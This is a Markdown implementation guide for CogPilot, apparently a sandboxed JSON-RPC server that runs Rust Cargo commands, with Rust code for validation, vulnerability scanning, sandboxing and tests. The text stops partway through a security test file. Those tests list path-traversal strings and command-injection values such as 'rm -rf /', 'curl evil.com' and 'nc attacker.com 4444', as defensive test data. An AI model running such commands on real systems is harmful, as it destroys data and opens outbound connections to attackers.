# CogPilot Implementation Guide

## Table of Contents

- [Overview](#overview)
- [Development Environment Setup](#development-environment-setup)
- [Architecture Implementation](#architecture-implementation)
- [Security Layer Implementation](#security-layer-implementation)
- [API Layer Implementation](#api-layer-implementation)
- [External Tool Integration](#external-tool-integration)
- [Testing Strategy](#testing-strategy)
- [Deployment Guidelines](#deployment-guidelines)
- [Performance Optimization](#performance-optimization)
- [Monitoring and Observability](#monitoring-and-observability)

## Overview

This document provides detailed implementation guidance for building CogPilot, a secure MCP server for Rust Cargo commands. The implementation follows security-first principles with comprehensive validation, isolation, and monitoring capabilities.

### Implementation Phases

1. **Phase 1**: Core security infrastructure and localhost-only API
2. **Phase 2**: Cargo command implementations with reduced resource limits
3. **Phase 3**: External tool integration
4. **Phase 4**: Cross-platform deployment (Windows/Linux)
5. **Phase 5**: Performance optimization and production hardening

## Development Environment Setup

### Prerequisites

**System Requirements**:

- Rust 1.70+ with cargo
- Git 2.30+
- Docker (for containerized deployment)
- Cross-compilation tools for target platforms

**Target Platforms**:

- Windows 10/11 (x64)
- Linux (x64) - Ubuntu 20.04+, CentOS 7+, Debian 10+
- Docker containers for consistent deployment

**Development Tools**:

```bash
# Install Rust and Cargo
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Add cross-compilation targets
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-gnu

# Install required tools
cargo install cargo-audit
cargo install cargo-deny
cargo install cargo-llvm-cov
cargo install cargo-mutants
cargo install cargo-nextest
cargo install cross  # For cross-compilation
```

### Project Structure

```
cog_pilot/
├── Cargo.toml
├── src/
│   ├── main.rs
│   ├── lib.rs
│   ├── api/
│   │   ├── mod.rs
│   │   ├── jsonrpc.rs
│   │   └── handlers.rs
│   ├── security/
│   │   ├── mod.rs
│   │   ├── validation.rs
│   │   ├── scanner.rs
│   │   └── sandbox.rs
│   ├── execution/
│   │   ├── mod.rs
│   │   ├── cargo_commands.rs
│   │   └── external_tools.rs
│   ├── config/
│   │   ├── mod.rs
│   │   └── settings.rs
│   └── utils/
│       ├── mod.rs
│       ├── logging.rs
│       └── metrics.rs
├── tests/
│   ├── integration/
│   ├── security/
│   └── performance/
├── configs/
│   ├── default.toml
│   └── production.toml
└── docs/
    └── api.md
```

### Dependencies

**Cargo.toml**:

```toml
[package]
name = "cog_pilot"
version = "0.1.0"
edition = "2021"

[dependencies]
# Core dependencies
tokio = { version = "1.0", features = ["full"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
uuid = { version = "1.0", features = ["v4"] }
chrono = { version = "0.4", features = ["serde"] }

# HTTP and JSON-RPC
axum = "0.7"
jsonrpc-core = "18.0"
jsonrpc-http-server = "18.0"

# Security
regex = "1.10"
url = "2.5"
sha2 = "0.10"
base64 = "0.21"

# Process management
tokio-process = "0.2"
nix = "0.27"

# Configuration
config = "0.14"
toml = "0.8"

# Logging and metrics
tracing = "0.1"
tracing-subscriber = "0.3"
metrics = "0.21"
metrics-exporter-prometheus = "0.12"

# HTTP client for OSV.dev
reqwest = { version = "0.11", features = ["json", "rustls-tls"] }

# Testing
[dev-dependencies]
assert_matches = "1.5"
tempfile = "3.8"
wiremock = "0.5"
```

## Architecture Implementation

### Core Components

#### 1. JSON-RPC Server

**File**: `src/api/jsonrpc.rs`

```rust
use jsonrpc_core::{IoHandler, Result as JsonRpcResult, Error as JsonRpcError};
use jsonrpc_http_server::{ServerBuilder, DomainsValidation};
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use crate::security::SecurityEngine;
use crate::execution::ExecutionEngine;

#[derive(Debug, Clone)]
pub struct CogPilotServer {
    security_engine: SecurityEngine,
    execution_engine: ExecutionEngine,
}

impl CogPilotServer {
    pub fn new(security_engine: SecurityEngine, execution_engine: ExecutionEngine) -> Self {
        Self {
            security_engine,
            execution_engine,
        }
    }

    pub async fn start(&self, addr: SocketAddr) -> Result<(), Box<dyn std::error::Error>> {
        let mut io = IoHandler::new();

        // Register all cargo commands
        self.register_cargo_commands(&mut io);

        // Register external tool commands
        self.register_external_tools(&mut io);

        let server = ServerBuilder::new(io)
            .threads(4)
            .cors(DomainsValidation::AllowOnly(vec![
                "localhost:3000".into(),
                "127.0.0.1:3000".into(),
            ]))
            .start_http(&addr)?;

        tracing::info!("CogPilot server started on {}", addr);
        server.wait();

        Ok(())
    }

    fn register_cargo_commands(&self, io: &mut IoHandler) {
        let security_engine = self.security_engine.clone();
        let execution_engine = self.execution_engine.clone();

        io.add_method("cargo_build", move |params| {
            let security_engine = security_engine.clone();
            let execution_engine = execution_engine.clone();

            async move {
                // Validate inputs
                let validated_params = security_engine.validate_cargo_build(params).await
                    .map_err(|e| JsonRpcError::invalid_params(e.to_string()))?;

                // Execute command
                let result = execution_engine.execute_cargo_build(validated_params).await
                    .map_err(|e| JsonRpcError::internal_error())?;

                Ok(result)
            }
        });

        // Add other cargo commands...
    }
}
```

#### 2. Security Engine

**File**: `src/security/mod.rs`

```rust
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use crate::security::scanner::VulnerabilityScanner;
use crate::security::validation::InputValidator;

#[derive(Debug, Clone)]
pub struct SecurityEngine {
    validator: InputValidator,
    scanner: VulnerabilityScanner,
    config: SecurityConfig,
}

#[derive(Debug, Clone)]
pub struct SecurityConfig {
    pub max_execution_time: u64,
    pub max_memory_usage: u64,
    pub max_disk_io: u64,
    pub allowed_registries: Vec<String>,
    pub blocked_packages: Vec<String>,
}

impl SecurityEngine {
    pub fn new(config: SecurityConfig) -> Self {
        Self {
            validator: InputValidator::new(),
            scanner: VulnerabilityScanner::new(),
            config,
        }
    }

    pub async fn validate_cargo_add(&self, params: &CargoAddParams) -> Result<ValidatedCargoAdd, SecurityError> {
        // 1. Input validation
        self.validator.validate_package_name(&params.package)?;
        if let Some(version) = &params.version {
            self.validator.validate_version_spec(version)?;
        }

        // 2. Security scanning
        let scan_result = self.scanner.scan_package(&params.package, params.version.as_deref()).await?;

        // 3. Risk assessment
        let risk_level = self.assess_risk(&scan_result)?;

        // 4. Policy enforcement
        if risk_level >= RiskLevel::High && !params.force_insecure {
            return Err(SecurityError::HighRiskPackage(scan_result));
        }

        Ok(ValidatedCargoAdd {
            package: params.package.clone(),
            version: params.version.clone(),
            scan_result,
            risk_level,
        })
    }

    fn assess_risk(&self, scan_result: &ScanResult) -> Result<RiskLevel, SecurityError> {
        let mut risk_score = 0;

        // CVE severity scoring
        for vuln in &scan_result.vulnerabilities {
            risk_score += match vuln.severity {
                Severity::Critical => 10,
                Severity::High => 7,
                Severity::Medium => 4,
                Severity::Low => 1,
            };
        }

        // Package maintenance scoring
        if scan_result.last_updated_days > 365 {
            risk_score += 5;
        }

        // Download count scoring
        if scan_result.downloads < 1000 {
            risk_score += 3;
        }

        // Determine risk level
        match risk_score {
            0..=2 => Ok(RiskLevel::Low),
            3..=6 => Ok(RiskLevel::Medium),
            7..=15 => Ok(RiskLevel::High),
            _ => Ok(RiskLevel::Critical),
        }
    }
}
```

#### 3. Input Validation

**File**: `src/security/validation.rs`

```rust
use regex::Regex;
use once_cell::sync::Lazy;
use std::path::{Path, PathBuf};

static PACKAGE_NAME_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"^[a-zA-Z][a-zA-Z0-9_\-]{0,63}$").unwrap()
});

static VERSION_SPEC_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"^[~^>=<]?[0-9]+(\.[0-9]+)*(-[a-zA-Z0-9\-]+)?(\+[a-zA-Z0-9\-]+)?$").unwrap()
});

static FEATURE_NAME_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"^[a-zA-Z][a-zA-Z0-9_\-]{0,63}$").unwrap()
});

static GIT_URL_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"^https://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(/.*)?\.git$").unwrap()
});

#[derive(Debug, Clone)]
pub struct InputValidator;

impl InputValidator {
    pub fn new() -> Self {
        Self
    }

    pub fn validate_package_name(&self, name: &str) -> Result<(), ValidationError> {
        if !PACKAGE_NAME_REGEX.is_match(name) {
            return Err(ValidationError::InvalidPackageName(name.to_string()));
        }

        // Check against blocked packages
        if self.is_blocked_package(name) {
            return Err(ValidationError::BlockedPackage(name.to_string()));
        }

        Ok(())
    }

    pub fn validate_version_spec(&self, version: &str) -> Result<(), ValidationError> {
        if !VERSION_SPEC_REGEX.is_match(version) {
            return Err(ValidationError::InvalidVersionSpec(version.to_string()));
        }
        Ok(())
    }

    pub fn validate_feature_name(&self, feature: &str) -> Result<(), ValidationError> {
        if !FEATURE_NAME_REGEX.is_match(feature) {
            return Err(ValidationError::InvalidFeatureName(feature.to_string()));
        }
        Ok(())
    }

    pub fn validate_git_url(&self, url: &str) -> Result<(), ValidationError> {
        if !GIT_URL_REGEX.is_match(url) {
            return Err(ValidationError::InvalidGitUrl(url.to_string()));
        }
        Ok(())
    }

    pub fn validate_path(&self, path: &str) -> Result<PathBuf, ValidationError> {
        // Reject parent directory traversal
        if path.contains("../") {
            return Err(ValidationError::ParentDirectoryAccess);
        }

        // Reject absolute paths
        if path.starts_with('/') || path.contains(":\\") {
            return Err(ValidationError::AbsolutePath);
        }

        // Reject hidden directories
        if path.starts_with(".git/") || path.starts_with(".cargo/") {
            return Err(ValidationError::HiddenDirectoryAccess);
        }

        // Canonicalize and validate
        let canonical = std::fs::canonicalize(path)
            .map_err(|_| ValidationError::InvalidPath(path.to_string()))?;

        let working_dir = std::env::current_dir()
            .map_err(|_| ValidationError::WorkingDirectoryError)?;

        if !canonical.starts_with(&working_dir) {
            return Err(ValidationError::OutsideWorkingDirectory);
        }

        Ok(canonical)
    }

    fn is_blocked_package(&self, name: &str) -> bool {
        // Check against known malicious packages
        const BLOCKED_PACKAGES: &[&str] = &[
            "malicious-package",
            "test-malware",
            // Add more as needed
        ];

        BLOCKED_PACKAGES.contains(&name)
    }
}
```

#### 4. Vulnerability Scanner

**File**: `src/security/scanner.rs`

```rust
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;
use tokio::time::timeout;

#[derive(Debug, Clone)]
pub struct VulnerabilityScanner {
    client: Client,
    cache: HashMap<String, ScanResult>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    pub package: String,
    pub version: Option<String>,
    pub vulnerabilities: Vec<Vulnerability>,
    pub last_updated_days: u32,
    pub downloads: u64,
    pub is_yanked: bool,
    pub license: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Vulnerability {
    pub id: String,
    pub severity: Severity,
    pub description: String,
    pub affected_versions: Vec<String>,
    pub fixed_versions: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
}

impl VulnerabilityScanner {
    pub fn new() -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .expect("Failed to create HTTP client");

        Self {
            client,
            cache: HashMap::new(),
        }
    }

    pub async fn scan_package(&self, package: &str, version: Option<&str>) -> Result<ScanResult, ScanError> {
        let cache_key = format!("{}:{}", package, version.unwrap_or("latest"));

        // Check cache first
        if let Some(cached) = self.cache.get(&cache_key) {
            return Ok(cached.clone());
        }

        // Perform multiple security checks
        let (osv_result, crates_info, license_info) = tokio::try_join!(
            self.check_osv_vulnerabilities(package, version),
            self.get_crates_info(package),
            self.check_license_compatibility(package)
        )?;

        let scan_result = ScanResult {
            package: package.to_string(),
            version: version.map(|v| v.to_string()),
            vulnerabilities: osv_result,
            last_updated_days: crates_info.last_updated_days,
            downloads: crates_info.downloads,
            is_yanked: crates_info.is_yanked,
            license: license_info,
        };

        Ok(scan_result)
    }

    async fn check_osv_vulnerabilities(&self, package: &str, version: Option<&str>) -> Result<Vec<Vulnerability>, ScanError> {
        let query = OsvQuery {
            package: OsvPackage {
                name: package.to_string(),
                ecosystem: "crates.io".to_string(),
            },
            version: version.map(|v| v.to_string()),
        };

        let response = timeout(Duration::from_secs(30),
            self.client.post("https://api.osv.dev/v1/query")
                .json(&query)
                .send()
        ).await
        .map_err(|_| ScanError::Timeout)?
        .map_err(|e| ScanError::HttpError(e))?;

        let osv_response: OsvResponse = response.json().await
            .map_err(|e| ScanError::ParseError(e.to_string()))?;

        let vulnerabilities = osv_response.vulns.into_iter()
            .map(|v| Vulnerability {
                id: v.id,
                severity: self.parse_severity(&v.severity),
                description: v.summary,
                affected_versions: v.affected.into_iter()
                    .flat_map(|a| a.versions)
                    .collect(),
                fixed_versions: v.fixed_versions.unwrap_or_default(),
            })
            .collect();

        Ok(vulnerabilities)
    }

    async fn get_crates_info(&self, package: &str) -> Result<CratesInfo, ScanError> {
        let url = format!("https://crates.io/api/v1/crates/{}", package);

        let response = timeout(Duration::from_secs(30),
            self.client.get(&url).send()
        ).await
        .map_err(|_| ScanError::Timeout)?
        .map_err(|e| ScanError::HttpError(e))?;

        let crates_response: CratesResponse = response.json().await
            .map_err(|e| ScanError::ParseError(e.to_string()))?;

        Ok(CratesInfo {
            last_updated_days: crates_response.crate_data.last_updated_days,
            downloads: crates_response.crate_data.downloads,
            is_yanked: crates_response.crate_data.is_yanked,
        })
    }

    fn parse_severity(&self, severity: &str) -> Severity {
        match severity.to_lowercase().as_str() {
            "critical" => Severity::Critical,
            "high" => Severity::High,
            "medium" => Severity::Medium,
            "low" => Severity::Low,
            _ => Severity::Medium, // Default to medium for unknown
        }
    }
}
```

## Security Layer Implementation

### Resource Management

**File**: `src/execution/resource_manager.rs`

```rust
use std::process::{Child, Command};
use std::time::{Duration, Instant};
use tokio::time::timeout;
use nix::sys::signal::{kill, Signal};
use nix::unistd::Pid;

#[derive(Debug, Clone)]
pub struct ResourceLimits {
    pub max_execution_time: Duration,
    pub max_memory_mb: u64,
    pub max_disk_io_mb: u64,
}

impl Default for ResourceLimits {
    fn default() -> Self {
        Self {
            max_execution_time: Duration::from_secs(300),
            max_memory_mb: 2048,
            max_disk_io_mb: 1024,
        }
    }
}

pub struct ResourceManager {
    limits: ResourceLimits,
}

impl ResourceManager {
    pub fn new(limits: ResourceLimits) -> Self {
        Self { limits }
    }

    pub async fn execute_with_limits(&self, mut command: Command) -> Result<ExecutionResult, ExecutionError> {
        let start_time = Instant::now();

        // Set resource limits using cgroups (Linux) or job objects (Windows)
        #[cfg(target_os = "linux")]
        self.set_linux_limits(&mut command)?;

        #[cfg(target_os = "windows")]
        self.set_windows_limits(&mut command)?;

        // Spawn process
        let mut child = command.spawn()
            .map_err(|e| ExecutionError::SpawnError(e.to_string()))?;

        // Execute with timeout
        let result = timeout(
            self.limits.max_execution_time,
            self.monitor_execution(&mut child, start_time)
        ).await;

        match result {
            Ok(Ok(execution_result)) => Ok(execution_result),
            Ok(Err(e)) => Err(e),
            Err(_) => {
                // Timeout - kill the process
                if let Some(pid) = child.id() {
                    let _ = kill(Pid::from_raw(pid as i32), Signal::SIGTERM);
                }
                Err(ExecutionError::Timeout)
            }
        }
    }

    #[cfg(target_os = "linux")]
    fn set_linux_limits(&self, command: &mut Command) -> Result<(), ExecutionError> {
        // Use systemd-run for resource limits
        command.arg("--property")
            .arg(format!("MemoryMax={}M", self.limits.max_memory_mb))
            .arg("--property")
            .arg(format!("IOWriteBandwidthMax={}M", self.limits.max_disk_io_mb))
            .arg("--property")
            .arg(format!("IOReadBandwidthMax={}M", self.limits.max_disk_io_mb));

        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn set_windows_limits(&self, command: &mut Command) -> Result<(), ExecutionError> {
        // Windows job objects implementation
        // This is a simplified version - full implementation would use Windows APIs
        Ok(())
    }

    async fn monitor_execution(&self, child: &mut Child, start_time: Instant) -> Result<ExecutionResult, ExecutionError> {
        let output = child.wait_with_output().await
            .map_err(|e| ExecutionError::WaitError(e.to_string()))?;

        let execution_time = start_time.elapsed();

        Ok(ExecutionResult {
            stdout: String::from_utf8_lossy(&output.stdout).to_string(),
            stderr: String::from_utf8_lossy(&output.stderr).to_string(),
            exit_code: output.status.code().unwrap_or(-1),
            execution_time: execution_time.as_secs_f64(),
        })
    }
}
```

### Sandbox Implementation

**File**: `src/security/sandbox.rs`

```rust
use std::env;
use std::path::PathBuf;
use std::collections::HashMap;
use std::fs;

#[derive(Debug, Clone)]
pub struct SandboxConfig {
    pub working_directory: PathBuf,
    pub allowed_env_vars: Vec<String>,
    pub temp_directory: PathBuf,
}

pub struct Sandbox {
    config: SandboxConfig,
}

impl Sandbox {
    pub fn new(config: SandboxConfig) -> Self {
        Self { config }
    }

    pub fn prepare_environment(&self) -> Result<SandboxEnvironment, SandboxError> {
        // Validate working directory
        self.validate_working_directory()?;

        // Create temporary directory
        let temp_dir = self.create_temp_directory()?;

        // Filter environment variables
        let env_vars = self.filter_environment_variables()?;

        // Set up file system permissions
        self.setup_file_permissions()?;

        Ok(SandboxEnvironment {
            working_directory: self.config.working_directory.clone(),
            temp_directory: temp_dir,
            env_vars,
        })
    }

    fn validate_working_directory(&self) -> Result<(), SandboxError> {
        // Ensure working directory exists and is accessible
        if !self.config.working_directory.exists() {
            return Err(SandboxError::WorkingDirectoryNotFound);
        }

        // Check that it's actually a directory
        if !self.config.working_directory.is_dir() {
            return Err(SandboxError::WorkingDirectoryNotDirectory);
        }

        // Ensure we can read/write to it
        let test_file = self.config.working_directory.join(".cog_pilot_test");
        fs::write(&test_file, "test").map_err(|_| SandboxError::WorkingDirectoryNotWritable)?;
        fs::remove_file(&test_file).map_err(|_| SandboxError::WorkingDirectoryNotWritable)?;

        Ok(())
    }

    fn create_temp_directory(&self) -> Result<PathBuf, SandboxError> {
        let temp_dir = self.config.temp_directory.join(format!("cog_pilot_{}", uuid::Uuid::new_v4()));

        fs::create_dir_all(&temp_dir)
            .map_err(|_| SandboxError::TempDirectoryCreationFailed)?;

        Ok(temp_dir)
    }

    fn filter_environment_variables(&self) -> Result<HashMap<String, String>, SandboxError> {
        let mut filtered_env = HashMap::new();

        for (key, value) in env::vars() {
            if self.is_allowed_env_var(&key) && self.is_safe_env_value(&value) {
                filtered_env.insert(key, value);
            }
        }

        // Add required environment variables
        filtered_env.insert("CARGO_HOME".to_string(), self.config.working_directory.join(".cargo").to_string_lossy().to_string());
        filtered_env.insert("RUSTUP_HOME".to_string(), self.config.working_directory.join(".rustup").to_string_lossy().to_string());

        Ok(filtered_env)
    }

    fn is_allowed_env_var(&self, key: &str) -> bool {
        const ALLOWED_ENV_VARS: &[&str] = &[
            "PATH",
            "HOME",
            "USER",
            "LANG",
            "LC_ALL",
            "TERM",
            "CARGO_HOME",
            "RUSTUP_HOME",
            "RUST_LOG",
        ];

        ALLOWED_ENV_VARS.contains(&key) || self.config.allowed_env_vars.contains(&key.to_string())
    }

    fn is_safe_env_value(&self, value: &str) -> bool {
        // Block values that might contain sensitive information
        let blocked_patterns = [
            "password",
            "secret",
            "token",
            "key",
            "credential",
        ];

        let value_lower = value.to_lowercase();
        !blocked_patterns.iter().any(|pattern| value_lower.contains(pattern))
    }

    fn setup_file_permissions(&self) -> Result<(), SandboxError> {
        // Set up file permissions to restrict access
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;

            // Restrict permissions on sensitive directories
            let git_dir = self.config.working_directory.join(".git");
            if git_dir.exists() {
                let mut perms = fs::metadata(&git_dir)
                    .map_err(|_| SandboxError::PermissionSetupFailed)?
                    .permissions();
                perms.set_mode(0o444); // Read-only
                fs::set_permissions(&git_dir, perms)
                    .map_err(|_| SandboxError::PermissionSetupFailed)?;
            }
        }

        Ok(())
    }
}

#[derive(Debug)]
pub struct SandboxEnvironment {
    pub working_directory: PathBuf,
    pub temp_directory: PathBuf,
    pub env_vars: HashMap<String, String>,
}

impl Drop for SandboxEnvironment {
    fn drop(&mut self) {
        // Clean up temporary directory
        let _ = fs::remove_dir_all(&self.temp_directory);
    }
}
```

## API Layer Implementation

### Command Handlers

**File**: `src/api/handlers.rs`

```rust
use crate::security::SecurityEngine;
use crate::execution::ExecutionEngine;
use serde::{Deserialize, Serialize};
use jsonrpc_core::{Result as JsonRpcResult, Error as JsonRpcError};

#[derive(Debug, Deserialize)]
pub struct CargoBuildParams {
    pub release: Option<bool>,
    pub target: Option<String>,
    pub features: Option<Vec<String>>,
    pub all_features: Option<bool>,
    pub no_default_features: Option<bool>,
}

#[derive(Debug, Serialize)]
pub struct CommandResult {
    pub success: bool,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub execution_time: f64,
}

pub struct CommandHandlers {
    security_engine: SecurityEngine,
    execution_engine: ExecutionEngine,
}

impl CommandHandlers {
    pub fn new(security_engine: SecurityEngine, execution_engine: ExecutionEngine) -> Self {
        Self {
            security_engine,
            execution_engine,
        }
    }

    pub async fn handle_cargo_build(&self, params: CargoBuildParams) -> JsonRpcResult<CommandResult> {
        // 1. Security validation
        let validated_params = self.security_engine.validate_cargo_build(&params).await
            .map_err(|e| JsonRpcError::from(e))?;

        // 2. Command execution
        let result = self.execution_engine.execute_cargo_build(validated_params).await
            .map_err(|e| JsonRpcError::from(e))?;

        // 3. Result processing
        Ok(CommandResult {
            success: result.exit_code == 0,
            stdout: result.stdout,
            stderr: result.stderr,
            exit_code: result.exit_code,
            execution_time: result.execution_time,
        })
    }

    pub async fn handle_cargo_add(&self, params: CargoAddParams) -> JsonRpcResult<CommandResult> {
        // 1. Enhanced security validation for cargo_add
        let validated_params = self.security_engine.validate_cargo_add(&params).await
            .map_err(|e| JsonRpcError::from(e))?;

        // 2. Create backup of Cargo.toml
        let backup_path = self.execution_engine.backup_cargo_toml().await
            .map_err(|e| JsonRpcError::from(e))?;

        // 3. Execute cargo add
        let result = self.execution_engine.execute_cargo_add(validated_params).await;

        match result {
            Ok(execution_result) => {
                // Success - remove backup
                let _ = std::fs::remove_file(backup_path);

                Ok(CommandResult {
                    success: execution_result.exit_code == 0,
                    stdout: execution_result.stdout,
                    stderr: execution_result.stderr,
                    exit_code: execution_result.exit_code,
                    execution_time: execution_result.execution_time,
                })
            }
            Err(e) => {
                // Error - restore backup
                let _ = self.execution_engine.restore_cargo_toml(backup_path).await;
                Err(JsonRpcError::from(e))
            }
        }
    }

    // Add other command handlers...
}
```

## External Tool Integration

### Tool Verification

**File**: `src/execution/external_tools.rs`

```rust
use std::collections::HashMap;
use std::process::Command;
use std::time::{Duration, Instant};
use tokio::time::timeout;

#[derive(Debug, Clone)]
pub struct ExternalToolManager {
    tool_cache: HashMap<String, ToolInfo>,
    cache_expiry: Duration,
}

#[derive(Debug, Clone)]
pub struct ToolInfo {
    pub name: String,
    pub version: String,
    pub path: String,
    pub last_checked: Instant,
    pub is_available: bool,
}

impl ExternalToolManager {
    pub fn new() -> Self {
        Self {
            tool_cache: HashMap::new(),
            cache_expiry: Duration::from_secs(300), // 5 minutes
        }
    }

    pub async fn verify_tool(&mut self, tool_name: &str) -> Result<ToolInfo, ToolError> {
        // Check cache first
        if let Some(cached_info) = self.tool_cache.get(tool_name) {
            if cached_info.last_checked.elapsed() < self.cache_expiry {
                if cached_info.is_available {
                    return Ok(cached_info.clone());
                } else {
                    return Err(ToolError::NotAvailable(tool_name.to_string()));
                }
            }
        }

        // Verify tool availability
        let tool_info = self.check_tool_availability(tool_name).await?;

        // Update cache
        self.tool_cache.insert(tool_name.to_string(), tool_info.clone());

        Ok(tool_info)
    }

    async fn check_tool_availability(&self, tool_name: &str) -> Result<ToolInfo, ToolError> {
        let version_command = self.get_version_command(tool_name);

        let output = timeout(
            Duration::from_secs(30),
            tokio::process::Command::new(&version_command.0)
                .args(&version_command.1)
                .output()
        ).await
        .map_err(|_| ToolError::Timeout(tool_name.to_string()))?
        .map_err(|_| ToolError::NotAvailable(tool_name.to_string()))?;

        if !output.status.success() {
            return Err(ToolError::NotAvailable(tool_name.to_string()));
        }

        let version_output = String::from_utf8_lossy(&output.stdout);
        let version = self.parse_version(&version_output)
            .unwrap_or_else(|| "unknown".to_string());

        Ok(ToolInfo {
            name: tool_name.to_string(),
            version,
            path: version_command.0,
            last_checked: Instant::now(),
            is_available: true,
        })
    }

    fn get_version_command(&self, tool_name: &str) -> (String, Vec<String>) {
        match tool_name {
            "cargo-llvm-cov" => ("cargo".to_string(), vec!["llvm-cov".to_string(), "--version".to_string()]),
            "cargo-audit" => ("cargo".to_string(), vec!["audit".to_string(), "--version".to_string()]),
            "cargo-deny" => ("cargo".to_string(), vec!["deny".to_string(), "--version".to_string()]),
            "cargo-mutants" => ("cargo".to_string(), vec!["mutants".to_string(), "--version".to_string()]),
            "cargo-nextest" => ("cargo".to_string(), vec!["nextest".to_string(), "--version".to_string()]),
            _ => (tool_name.to_string(), vec!["--version".to_string()]),
        }
    }

    fn parse_version(&self, output: &str) -> Option<String> {
        // Extract version from command output
        let version_regex = regex::Regex::new(r"(\d+\.\d+\.\d+)").ok()?;
        version_regex.find(output)
            .map(|m| m.as_str().to_string())
    }

    pub async fn execute_external_tool(&mut self, tool_name: &str, args: Vec<String>) -> Result<ExecutionResult, ToolError> {
        // Verify tool availability
        let tool_info = self.verify_tool(tool_name).await?;

        // Execute with resource limits
        let resource_manager = ResourceManager::new(ResourceLimits::default());

        let mut command = Command::new(&tool_info.path);
        command.args(&args);

        let result = resource_manager.execute_with_limits(command).await
            .map_err(|e| ToolError::ExecutionError(e.to_string()))?;

        Ok(result)
    }
}
```

## Testing Strategy

### Unit Tests

**File**: `tests/unit/validation_tests.rs`

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::validation::InputValidator;

    #[test]
    fn test_package_name_validation() {
        let validator = InputValidator::new();

        // Valid package names
        assert!(validator.validate_package_name("serde").is_ok());
        assert!(validator.validate_package_name("tokio-util").is_ok());
        assert!(validator.validate_package_name("my_package").is_ok());

        // Invalid package names
        assert!(validator.validate_package_name("123invalid").is_err());
        assert!(validator.validate_package_name("package.name").is_err());
        assert!(validator.validate_package_name("pkg with spaces").is_err());
        assert!(validator.validate_package_name("").is_err());
        assert!(validator.validate_package_name("a".repeat(65).as_str()).is_err());
    }

    #[test]
    fn test_version_spec_validation() {
        let validator = InputValidator::new();

        // Valid version specs
        assert!(validator.validate_version_spec("1.0.0").is_ok());
        assert!(validator.validate_version_spec("^2.1").is_ok());
        assert!(validator.validate_version_spec("~1.2.3-alpha").is_ok());
        assert!(validator.validate_version_spec(">=1.0.0+build.1").is_ok());

        // Invalid version specs
        assert!(validator.validate_version_spec("latest").is_err());
        assert!(validator.validate_version_spec("1.*.0").is_err());
        assert!(validator.validate_version_spec("version-string").is_err());
    }

    #[test]
    fn test_path_validation() {
        let validator = InputValidator::new();

        // Valid paths (relative to current directory)
        assert!(validator.validate_path("src/main.rs").is_ok());
        assert!(validator.validate_path("target/debug").is_ok());

        // Invalid paths
        assert!(validator.validate_path("../parent").is_err());
        assert!(validator.validate_path("/absolute/path").is_err());
        assert!(validator.validate_path("C:\\windows\\system32").is_err());
        assert!(validator.validate_path(".git/config").is_err());
        assert!(validator.validate_path(".cargo/config").is_err());
    }
}
```

### Integration Tests

**File**: `tests/integration/api_tests.rs`

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use wiremock::{MockServer, Mock, ResponseTemplate};
    use wiremock::matchers::{method, path};

    #[tokio::test]
    async fn test_cargo_build_success() {
        let mock_server = MockServer::start().await;

        Mock::given(method("POST"))
            .and(path("/v1/query"))
            .respond_with(ResponseTemplate::new(200).set_body_json(&serde_json::json!({
                "vulns": []
            })))
            .mount(&mock_server)
            .await;

        let config = test_config(&mock_server.uri());
        let server = create_test_server(config).await;

        let request = serde_json::json!({
            "jsonrpc": "2.0",
            "method": "cargo_build",
            "params": {
                "release": true
            },
            "id": 1
        });

        let response = server.handle_request(request).await;

        assert!(response["result"]["success"].as_bool().unwrap());
        assert_eq!(response["result"]["exit_code"].as_i64().unwrap(), 0);
    }

    #[tokio::test]
    async fn test_cargo_add_with_vulnerability() {
        let mock_server = MockServer::start().await;

        Mock::given(method("POST"))
            .and(path("/v1/query"))
            .respond_with(ResponseTemplate::new(200).set_body_json(&serde_json::json!({
                "vulns": [{
                    "id": "CVE-2024-1234",
                    "severity": "HIGH",
                    "summary": "High severity vulnerability",
                    "affected": [{"versions": ["1.0.0"]}],
                    "fixed_versions": ["1.0.1"]
                }]
            })))
            .mount(&mock_server)
            .await;

        let config = test_config(&mock_server.uri());
        let server = create_test_server(config).await;

        let request = serde_json::json!({
            "jsonrpc": "2.0",
            "method": "cargo_add",
            "params": {
                "package": "vulnerable-package",
                "version": "1.0.0"
            },
            "id": 1
        });

        let response = server.handle_request(request).await;

        assert!(response["error"].is_object());
        assert_eq!(response["error"]["code"].as_i64().unwrap(), -32001);
    }
}
```

### Security Tests

**File**: `tests/security/penetration_tests.rs`

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_directory_traversal_protection() {
        let server = create_test_server_with_default_config().await;

        let malicious_requests = vec![
            ("../../../etc/passwd", "Path traversal attempt"),
            ("..\\..\\..\\windows\\system32", "Windows path traversal"),
            ("/etc/passwd", "Absolute path access"),
            ("C:\\Windows\\System32", "Windows system access"),
        ];

        for (malicious_path, description) in malicious_requests {
            let request = serde_json::json!({
                "jsonrpc": "2.0",
                "method": "cargo_build",
                "params": {
                    "target": malicious_path
                },
                "id": 1
            });

            let response = server.handle_request(request).await;

            assert!(response["error"].is_object(), "Failed to block: {}", description);
            assert_eq!(response["error"]["code"].as_i64().unwrap(), -32007);
        }
    }

    #[tokio::test]
    async fn test_command_injection_protection() {
        let server = create_test_server_with_default_config().await;

        let injection_attempts = vec![
            "package; rm -rf /",
            "package && curl evil.com",
            "package | nc attacker.com 4444",
